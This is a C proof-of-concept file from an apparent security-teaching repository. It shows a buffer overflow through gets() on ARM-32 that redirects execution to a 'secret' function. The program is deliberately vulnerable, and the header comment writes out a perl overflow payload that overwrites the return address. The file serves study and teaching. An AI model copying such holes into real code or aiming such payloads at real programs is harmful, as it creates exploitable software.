/*
 * arm_bof.c
 * BoF ROP PoC (on an ARM-32)
 * Part of my 'hacksec' github repo:
 * https://github.com/kaiwan/hacksec
 *
 * The purpose here is to demonstrate, in three ways, how a simple ROP (Return
 * Oriented Programming) attack - triggered via buffer overflow (BoF) to the
 * (terrible) gets(3) API - can result in the 'secret' function being invoked
 * (even though the original code path never directly calls it!).
 *
 * After building (with make):
 * 1) One way: direct: by running it like this:
 *  perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ./arm_bof_vuln_reg
 *
 * Of course, the address being passed here (in (1) and (2) via the file input2_secretfunc)
 * is one value I encountered (0x000104c4); you should use nm(1) to lookup the
 * precise address of the 'secret' function and use that value...
 * The helper script simple_bof_try1.sh does precisely that, and runs all variations.
 *
 * 2) Another way:
 *  ./arm_bof_vuln_reg < input2_secretfunc
 * 3) Third way: via running it interactively using gdb
 * (Refer the 'BOF_ROP_ARM.pdf document provided for details).
 *
 * Kaiwan N Billimoria
 * kaiwanTECH (Designer Graphix)
 *
 * Credits: Original Ref: YouTube tut:
 *  https://www.youtube.com/watch?v=7P9lnpAZy60
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void secret_func(void)
{  
	char b[25];
	snprintf(b, 25, "CTF Secret 0x%lx\n", (unsigned long)&secret_func);
	printf("YAY! Entered secret_func()! %s\n", b);
}

static void foo(char *param1)
{
	char local[12];
	gets(local);
}

int main (int argc, char **argv)
{
	foo(argv[1]);
	printf("Ok, about to exit...\n");
	exit(EXIT_SUCCESS);
}
